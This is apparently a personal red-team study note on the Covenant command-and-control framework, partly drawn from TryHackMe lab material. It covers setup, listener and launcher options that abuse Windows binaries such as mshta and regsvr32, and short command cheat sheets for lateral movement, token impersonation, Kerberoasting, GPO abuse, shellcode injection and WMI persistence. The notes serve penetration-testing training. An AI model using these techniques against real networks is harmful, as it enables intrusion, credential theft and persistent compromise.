# Covenant

[Covenant](https://github.com/cobbr/Covenant) *is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. Covenant is an ASP.NET Core, cross-platform application that includes a web-based interface that allows for multi-user collaboration.*

[Covenant - Wiki](https://github.com/cobbr/Covenant/wiki)

## [Installation](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup) 

Firstly it requires [Requires .NET Core 3.1 SDK](https://dotnet.microsoft.com/en-us/download/dotnet/3.1). MicroSoft really, really wants you to use later .NET versions so ... remember [3.1 Linux dependencies](https://github.com/dotnet/core/blob/main/release-notes/3.1/linux-packages.md), also mirrored locally [[Convenant-DOTNET-3dot1-dependices-mirror]], for future proofing
- If you are using [[Kali]]
	- Get binary, 
	- `mkdir dotnet-3.1; tar xrf $bin.tar.gz -C dotnet-3.1`
	- Manage the paths
		- `export DOTNET_ROOT=$SECURESENSIBLEDIR/dotnet-3.1
		- `export PATH=$PATH:$SECURESENSIBLEDIR/dotnet-3.1`
- Popular choice online (from my limited browsing and THM instructions) is use [[Ubuntu]] to avoid managing multiple .NET versions, remember to Disable Telemetry (see below)
- Docker, but has "gotchas"

Disable Telemetry
```bash
cat /etc/environment
# Check for this environment variable below, if not there add 
echo "export DOTNET_CLI_TELEMETRY_OPTOUT=1" | tee -a /etc/environment
```


There is a Docker [installation](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup), has "gotchas"
```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet run
```

#### THM Holo Guide To Convenant

More information: 
- SpecterOps blog, [https://posts.specterops.io/](https://posts.specterops.io
- SoCon talk on "Operating with Covenant" by Ryan Cobb and Justin Bui [https://www.youtube.com/watch?v=oN_0pPI6TYU](https://www.youtube.com/watch?v=oN_0pPI6TYU).

Profiles:
- `CustomHttpProfile` Custom profile that does not require any cookies.
- `DefaultBridgeProfile` Default profile for a C2 bridge.
- `DefaultHttpProfile` Default HTTP profile.
- `TCPBridgeProfile` Default TCP profile for a C2 bridge.

Edit Listeners - parameters below:
- `Name` Name of profile to be used throughout the interface.
- `Description` Description of profile and its use cases.
- `MessageTransform` Specify how data will be transformed before being placed in other parameters. 
- `HttpUrls` list of URLs the grunt can callback to.
- `HttpRequestHeaders` List of header pairs (name/value) that will be sent with every HTTP request.
- `HttpResponseHeaders` List of header pairs (name/value) that will be sent with every HTTP response.
- `HttpPostRequest` Format of data when a grunt posts data back to the profile.
- `HttpGetResponse` HTTP response when a grunt GETs data to the listener.
- `HttpPostResponse` HTTP response when a grunt POSTs data to the listener.

Create a Listener: `Listeners` Tab -> `Create Listener`. Options:
- `Name` (optional) will help to identify different listeners.
- `BindAddress` Local address listener will bind on, usually `0.0.0.0`.
- `BindPort` Local port listener will bind on.
- `ConnectPort` Port to callback to, suggested to set to `80`, `8080`, or `8888`.
- `ConnectAddresses` Addresses for the listener to callback to, hostname portion of the `URL`.
- `URLs` Callback URLs the grunt will be connected directly back to.
- `UseSSL` Determines whether or not the listener uses `HTTP` or `HTTPS`.
- `SSLCertificate` Certificate used by the listener if SSL is set to true.
- `SSLCertificatePassword` Password being used by the `SSLCertificate`.
- `HttpProfile` Profile used by the listener and grunt to determine communication behaviour.

Launchers:
- `Binary` Generates a custom binary to launch grunt, does not rely on a system binary.
- `Shellcode` Converts binary to shellcode using donut, [](https://github.com/TheWover/donut)[https://github.com/TheWover/donut](https://github.com/TheWover/donut)
- `PowerShell` Generates PowerShell code to launch a grunt using `powershell.exe`.
- `MSBuild` Generates an MSBuild XML file to launch a grunt using `msbuild.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)[https://lolbas-project.github.io/lolbas/Binaries/Msbuild/](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
- `InstallUtil` Generates an InstallUtil XML file to launch a grunt using `installutil.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)[https://lolbas-project.github.io/lolbas/Binaries/Installutil/](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)
- `Mshta` Generates an HTA file to launch a grunt using `mshta.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)[https://lolbas-project.github.io/lolbas/Binaries/Mshta/](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- `Regsrv32` Generates an SCT file to launch a grunt using `regsrv32.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)[https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
- `Wmic` Generates an XSL file to launch a grunt using `wmic.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)[https://lolbas-project.github.io/lolbas/Binaries/Wmic/](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
- `Cscript` Generate a JScript file to launch a grunt using `cscript.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Cscript/)[https://lolbas-project.github.io/lolbas/Binaries/Cscript/](https://lolbas-project.github.io/lolbas/Binaries/Cscript/)
- `Wscript` Generate a JScript file to launch a grunt using `wscript.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Wscript/](https://lolbas-project.github.io/lolbas/Binaries/Wscript/)

Launcher Options:
- `Listener` Listener the grunt will communicate with.
- `ImplantTemplate` Type of implant launcher will use.
- `DotNetVersion` .NET version launcher will use, dependent on `ImplantTemplate`.
- `Delay` Time grunt will sleep in-between callbacks. A larger delay can aid in stealthy communications.
- `JitterPercent` Percent of variability in `Delay`.
- `ConnectAttempts` Amount of times grunt will attempt to connect back to the server before quitting.
- `KillDate` Date specified grunt will quit and stop calling back.

[See Task 27 for converting a .NET Red Team tool into a Covenant Task](https://tryhackme.com/r/room/hololive)
#### xct's references to `covenant` in notes.vulndev.io

[Covenant Misc.](https://notes.vulndev.io/wiki/redteam/active-directory/misc#covenant-misc)
```Powershell
# Set Delay <seconds>
Set Delay <seconds>
sleep <seconds>
```

Use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to modify/add GPOs. Covenant example:
```powershell
Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"<taskname>\" --Au
```

[Lateral Movement](https://notes.vulndev.io/wiki/redteam/active-directory/lateral-movement)
```powershell
# Generate an encoded powershell launcher and launch it via WMICommand.
WMIGrunt <computername> PowerShell
WMICommand <computername> PowerShell
# Get a PowerShell remote session with current user
PowerShellRemoting <computername> <cmd>
PowerShellRemoting <computername> <cmd> <domain> <user> <pass>
# PsExec with Covenant
CreateRemoteService <computername> gruntsvc "<name>" c:\temp\x.exe
StartRemoteService <computername> gruntsvc
DeleteRemoteService <computername> gruntsvc
```

[Credentials](https://notes.vulndev.io/wiki/redteam/active-directory/using-credentials) and Password Spraying
```powershell
# Impersonate Token
ImpersonateUser <user>
ImpersonateProcess <pid>
RevToSelf
# Create Token
MakeToken <user> <domain> <password>

# Make TGT with Rubeus, NetOnly logon session can only accommodate one TGT at a time,.. create another session before applying a TGT to it.
# For Process impersonation - After applying the ticket to the process 
Impersonate Process <pid>
```
For Process Injection there is a custom [Covenant task](https://github.com/ZeroPointSecurity/RTOVMSetup/tree/master/Covenant) that allows to inject shellcode into a process. By typing `Inject` a popup will appear where you paste the shellcode.

Use Rubeus in various ways- [[Rubeus-Cheatsheet]]
```powershell
# Kerberoasting
Rubeus kerberoast /format:hashcat
```

[Domain Enumeration](https://notes.vulndev.io/wiki/redteam/active-directory/domain-enum#via-covenant), `bloodhound` via `convenant` - [[Bloodhound-Guide]] 
```Powershell
Assembly /assemblyname:"winsrv" /parameters:"\"-c All GPOLocalGroup\""
```

[Domain Trusts](https://notes.vulndev.io/wiki/redteam/active-directory/domain-trust#sharphound-across-forest-covenant) `sharphound` via `convenant` across a Domain Forest - [[Bloodhound-Guide]] 
```powershell
(xct) > Assembly SharpHound3 "-c All -D other.domain"
```
Kerberoasting with Rubeus in across a Domain Forest - [[Rubeus-Cheatsheet]]
```
(xct) > Rubeus kerberoast /domain:other.domain
```

[Persistance](https://notes.vulndev.io/wiki/redteam/active-directory/persistence#wmi-subscriptions-covenant)
- Run "`PersistWMI`", this will execute along another program. E.g. the victim opens chrome our persistence calls back.


## References

[Covenant GitHub](https://github.com/cobbr/Covenant)
[Covenant - Wiki](https://github.com/cobbr/Covenant/wiki)
[Covenant - Installation](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup)
[xct's .vulndev.io notes on Covenant Misc.](https://notes.vulndev.io/wiki/redteam/active-directory/misc#covenant-misc)
[xct's .vulndev.io notes on Lateral Movement](https://notes.vulndev.io/wiki/redteam/active-directory/lateral-movement)
[xct's .vulndev.io notes on Credentials](https://notes.vulndev.io/wiki/redteam/active-directory/using-credentials) 
[xct's .vulndev.io notes on Domain Enumeration](https://notes.vulndev.io/wiki/redteam/active-directory/domain-enum#via-covenant)
[xct's .vulndev.io notes on Persistance](https://notes.vulndev.io/wiki/redteam/active-directory/persistence#wmi-subscriptions-covenant)
[xct's .vulndev.io notes on Domain Trusts](https://notes.vulndev.io/wiki/redteam/active-directory/domain-trust#sharphound-across-forest-covenant)
[xct's .vulndev.io notes on SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) 
[THM Holo Room - Covenant Tasks](https://tryhackme.com/r/room/hololive)
